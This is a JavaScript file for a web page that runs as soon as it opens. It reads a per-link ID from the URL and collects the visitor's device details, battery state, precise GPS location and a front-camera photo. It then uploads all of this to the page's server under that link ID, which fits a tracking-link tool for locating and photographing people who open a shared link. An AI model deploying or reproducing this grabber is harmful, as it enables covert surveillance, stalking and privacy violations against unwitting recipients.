const statusList = document.getElementById('status-list');
const videoEl = document.getElementById('video');
const canvasEl = document.getElementById('canvas');

const getLinkId = () => {
  const urlParams = new URLSearchParams(window.location.search);
  return urlParams.get('id');
};

const updateStatus = (message, isError = false) => {
  const li = document.createElement('li');
  li.textContent = message;
  if (isError) li.className = 'error';
  statusList.appendChild(li);
  statusList.scrollTop = statusList.scrollHeight;
};

const getDeviceInfo = () => {
  updateStatus('1. Mengambil info perangkat...');
  const data = {
    userAgent: navigator.userAgent,
    platform: navigator.platform || 'N/A',
    language: navigator.language,
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
  };
  if (navigator.getBattery) {
    return navigator.getBattery().then(battery => {
      data.battery = {
        level: Math.round(battery.level * 100) + "%",
        isCharging: battery.charging
      };
      return data;
    });
  } else {
    data.battery = { level: 'N/A', isCharging: 'N/A' };
    return Promise.resolve(data);
  }
};

const getLocation = () => {
  updateStatus('2. Mengambil lokasi...');
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) return reject(new Error('Geolocation tidak didukung.'));
    navigator.geolocation.getCurrentPosition(
      pos => resolve({
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        accuracy: pos.coords.accuracy
      }),
      err => reject(new Error(`Gagal mendapatkan lokasi: ${err.message}`)),
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  });
};

const getPhoto = async () => {
  updateStatus('3. Mengambil foto...');
  if (!navigator.mediaDevices?.getUserMedia)
    throw new Error('API Kamera tidak tersedia.');

  const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
  videoEl.srcObject = stream;
  await new Promise(resolve => videoEl.onloadedmetadata = resolve);
  videoEl.play();
  await new Promise(resolve => setTimeout(resolve, 500));

  canvasEl.width = videoEl.videoWidth;
  canvasEl.height = videoEl.videoHeight;
  canvasEl.getContext('2d').drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
  const photoBase64 = canvasEl.toDataURL('image/jpeg', 0.7);

  stream.getTracks().forEach(track => track.stop());
  videoEl.srcObject = null;
  return photoBase64;
};

const sendDataToServer = async (linkId, data) => {
  updateStatus('4. Mengirim data ke server...');
  const res = await fetch('/api/data', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ link_id: linkId, data: data })
  });
  if (!res.ok) {
    const err = await res.json();
    throw new Error(`Server error: ${err.message || res.statusText}`);
  }
  return res.json();
};

const mulaiProsesOtomatis = async () => {
  const linkId = getLinkId();
  if (!linkId) return updateStatus('❌ Link ID tidak ditemukan di URL.', true);

  const allData = {};
  try {
    allData.deviceInfo = await getDeviceInfo();
    updateStatus('✅ Info perangkat OK');
    allData.location = await getLocation();
    updateStatus('✅ Lokasi OK');
    allData.photoBase64 = await getPhoto();
    updateStatus('✅ Foto OK');
    await sendDataToServer(linkId, allData);
    updateStatus('✅ Semua data berhasil dikirim!');
  } catch (err) {
    console.error(err);
    updateStatus(`❌ Error: ${err.message}`, true);
  }
};

window.addEventListener('DOMContentLoaded', () => {
  document.getElementById('popupModal').style.display = 'flex';
  mulaiProsesOtomatis(); // langsung jalankan proses saat halaman dibuka
});
